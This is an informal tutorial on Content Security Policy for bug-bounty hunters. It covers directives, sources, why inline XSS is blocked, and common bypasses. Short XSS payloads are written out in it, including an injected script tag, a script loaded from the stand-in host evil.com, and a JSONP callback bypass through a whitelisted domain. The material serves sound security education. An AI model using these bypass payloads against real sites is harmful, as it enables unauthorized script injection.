# Content Security Policy (CSP) — FULL SIMPLE EXPLANATION

I’ll explain:

1. What CSP is
2. Why it exists
3. How browsers use it
4. What directives mean
5. Why XSS fails even when injection exists
6. Why CSP bypasses happen
7. Reality of CSP in bug bounty

No skipping. No buzzwords. Let’s go.

---

## 1️⃣ What is CSP? (Real‑life example)

Imagine your website is a **house** 🏠
JavaScript, images, CSS, iframes are **people entering the house**.

Before CSP:

* Anyone can enter
* If attacker injects `<script>`, browser runs it

After CSP:

* You put a **security guard at the door**
* Guard has a **rule list**

> “Only people from THESE places can enter
> Everyone else → blocked”

That rule list = **Content Security Policy**

---

## 2️⃣ Who enforces CSP?

❌ NOT the server
❌ NOT JavaScript

✅ **The browser itself**

This is important.

Even if:

* HTML injection exists
* Script tag exists
* Payload is perfect

👉 **Browser will refuse to run it if CSP says NO**

That’s why CSP is powerful.

---

## 3️⃣ How CSP is sent to the browser

### Method 1 (STRONGEST – recommended)

HTTP response header:

```http
Content-Security-Policy: script-src 'self'
```

### Method 2 (WEAKER)

HTML meta tag:

```html
<meta http-equiv="Content-Security-Policy"
content="script-src 'self'">
```

⚠️ Meta CSP:

* Cannot protect everything
* Can be overridden by headers
* Still useful, but weaker

---

## 4️⃣ What are CSP directives? (Plain meaning)

Directives = **WHAT TYPE of content is controlled**

Think of directives as **categories**.

### Most important directives (explained simply)

#### `script-src`

Controls:

* `<script>`
* inline JS
* `onclick`
* `javascript:` URLs
* `eval()`

👉 **This is the XSS killer**

---

#### `default-src`

Fallback rule.

Means:

> “If I forgot to define a rule, use this one”

Example:

```http
default-src 'self'
```

Then automatically applies to:

* scripts
* images
* styles
* iframes
* fonts
* media

This is why many people get confused.

---

#### `img-src`

Controls images:

```html
<img src=...>
```

---

#### `style-src`

Controls:

* CSS files
* inline `<style>`

---

#### `frame-src`

Controls:

* `<iframe src=...>`

---

#### `connect-src`

Controls:

* `fetch`
* `XMLHttpRequest`
* `WebSocket`

Used to stop data exfiltration.

---

#### `object-src`

Controls:

* `<object>`
* `<embed>`
* `<applet>`

Flash attacks came from here.

---

#### `base-uri`

Controls `<base href>`

Stops attackers from rewriting links.

---

#### `form-action`

Controls where forms can submit.

Stops credential theft.

---

#### `frame-ancestors`

Controls who can embed THIS page.

Used to prevent clickjacking.

⚠️ **Does NOT work in meta CSP**

---

## 5️⃣ CSP Sources (Allowed places)

Sources define **WHERE content can load from**.

### Common sources (simple)

| Source            | Meaning                               |
| ----------------- | ------------------------------------- |
| `'self'`          | Same domain                           |
| `*`               | Almost anywhere (dangerous)           |
| `'none'`          | Nothing allowed                       |
| `data:`           | Base64 data (dangerous for JS)        |
| `'unsafe-inline'` | Allow inline JS (VERY BAD)            |
| `'unsafe-eval'`   | Allow eval() (BAD)                    |
| `nonce-xyz`       | Allow only scripts with correct nonce |
| `hash-abc`        | Allow only scripts matching hash      |

---

## 6️⃣ Why inline XSS fails (MOST IMPORTANT PART)

You injected:

```html
"><script>alert(1)</script>
```

CSP:

```http
default-src 'self'
```

You ask:

> “Where does it say inline scripts are blocked??”

Answer:

* Inline scripts fall under **script-src**
* script-src is **not defined**
* Browser uses **default-src**
* default-src = `'self'`
* Inline script ≠ self

So browser says:

> ❌ Blocked

---

### Key rule to remember:

> **If `unsafe-inline` is NOT present → inline JS is blocked**

Always.

---

## 7️⃣ Why CSP reports exist

Example:

```http
report-uri /_csp
```

Means:

> “Browser, when you block something, tell my server.”

Admins see:

* What payload was tried
* Which directive blocked it
* From which page

Used for:

* Monitoring attacks
* Debugging CSP

---

## 8️⃣ Why CSP bypasses exist (IMPORTANT REALITY)

CSP is **NOT magic**.

It trusts **allowed sources**.

So bypass happens when:

* Trusted source is **vulnerable**
* Trusted source loads **user input**
* Trusted source supports **JSONP**
* Trusted source has **open redirect**

CSP checks:

* ❌ Domain?
* ✅ Domain allowed → OK

It **does NOT inspect the code itself**.

---

## 9️⃣ Understanding bypass scenarios (explained simply)

### Scenario: `unsafe-inline`

```http
script-src 'self' 'unsafe-inline'
```

Meaning:

> “Inline JS is allowed”

So this works:

```html
<script>alert(1)</script>
```

➡️ CSP defeated by misconfiguration.

---

### Scenario: `unsafe-eval`

Allows:

```js
eval("alert(1)")
```

Used by old frameworks.

Still dangerous.

---

### Scenario: `*` wildcard

```http
script-src *
```

Means:

> “Load scripts from anywhere”

So attacker hosts:

```html
<script src="https://evil.com/x.js"></script>
```

Browser allows it.

---

### Scenario: JSONP

Whitelisted domain:

```http
script-src https://google.com
```

Google has:

```js
callback=alert
```

So:

```html
<script src="https://google.com/api?callback=alert"></script>
```

Browser trusts Google → XSS runs.

---

### Scenario: CDN with old JS

CDN is trusted:

```http
script-src cdnjs.cloudflare.com
```

Old Angular / Prototype versions:

* Known XSS gadgets

So CSP allows:

* Vulnerable library
* Which allows code execution

---

### Scenario: Open Redirect

Whitelisted domain redirects to another whitelisted endpoint.

Browser only checks **host**, not final payload logic.

---

## 🔟 Why META tag injection almost always fails

Meta tags:

* Don’t execute JS
* Mostly used for SEO
* CSP in meta is weaker
* Browser ignores dangerous meta injections

So:

```html
<meta content="javascript:alert(1)">
```

➡️ Almost always blocked or ignored.

That’s why **meta‑only reflection is not XSS**.

---

## 1️⃣1️⃣ Real bug bounty truth 💣

To report CSP‑related XSS, you MUST show:

✔ Script execution
✔ User interaction not required (usually)
✔ CSP misconfiguration
✔ Real impact

If you only have:

* Reflection
* Head injection
* Meta injection

❌ It will be rejected.
